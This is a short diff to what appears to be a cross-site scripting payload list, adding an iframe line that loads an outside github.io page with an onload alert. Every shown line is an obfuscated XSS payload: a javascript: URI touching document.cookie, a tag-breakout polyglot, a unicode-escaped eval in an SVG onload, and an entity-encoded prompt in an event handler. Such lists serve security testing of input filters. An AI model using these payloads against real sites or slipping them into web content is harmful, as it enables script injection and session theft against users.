@@ -5,7 +5,7 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 JavaScript://%250Aalert?.(1)//
 '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
 </Title/</Style/</Script/</textArea/</iFrame/</noScript>
-
+<iframe width="1000px" height="450px" src="https://amoloht.github.io" onload=alert("AmoloHT")>
 <svg on=x// //onload=\u0065\u0076\u0061\u006C("alert`/AmoloHT/`")>
 <body//%09%09////.//onmousemove='&#112;&#114;&#111;&#109;&#112;&#116;&lpar;&quot;&#65;&#109;&#111;&#108;&#111;&#72;&#84;&quot;&rpar;'//>
 x"//oNeRrOr=`/AmoloHT/`
